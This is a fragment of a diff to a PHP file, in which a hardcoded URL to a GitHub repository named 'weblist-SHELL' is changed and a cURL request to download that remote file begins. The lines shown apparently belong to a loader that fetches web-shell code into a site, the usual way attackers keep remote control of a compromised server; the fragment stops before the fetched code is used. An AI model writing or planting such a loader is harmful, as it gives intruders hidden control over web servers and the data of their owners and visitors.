@@ -832,7 +832,7 @@
 .
 .
 <?php
-    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/inc.php";
+    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
